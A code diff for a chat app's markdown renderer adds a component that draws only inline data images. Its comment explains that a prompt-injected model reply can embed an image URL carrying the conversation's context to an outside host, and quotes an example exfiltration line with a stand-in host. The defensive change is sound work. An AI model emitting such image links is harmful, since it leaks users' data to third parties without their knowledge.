@@ -25,6 +25,31 @@ const REHYPE_PLUGINS = [rehypeKatex, rehypeHighlight]
 const COMPONENTS: Components = {
   pre: CodeBlock as never,
   a: MarkdownLink,
+  img: MarkdownImage,
+}
+
+/*
+ * A picture in a reply, without fetching it.
+ *
+ * react-markdown turns `![alt](url)` into an `<img>`, and the webview loads whatever
+ * `src` it is given — which makes a markdown image an outbound request whose
+ * destination and query string are chosen by the model, or by a page the model
+ * scraped. That is a working exfiltration channel for a prompt-injected turn: the reply
+ * embeds `![](https://somewhere/?q=<the context it just read>)` and the request leaves
+ * the machine without anyone clicking anything. Links were already safe because they
+ * only open on a click (MarkdownLink); images are not a click.
+ *
+ * So only an inline data picture is rendered. KiChat's own pictures arrive as data URLs
+ * from the attachment store and are drawn by MessageImages, never by markdown, so
+ * nothing the app shows loses a picture to this rule. The rest of the image is kept as
+ * its alt text, because the words are the model's and a silent gap reads as a bug.
+ */
+function MarkdownImage({ src, alt }: React.ComponentPropsWithoutRef<'img'>) {
+  const url = typeof src === 'string' ? src : ''
+  if (url.startsWith('data:image/')) {
+    return <img src={url} alt={alt} />
+  }
+  return alt ? <span className="faint">{alt}</span> : null
 }
 
 export const Markdown = memo(function Markdown({ text, streaming = false, sources }: MarkdownProps) {
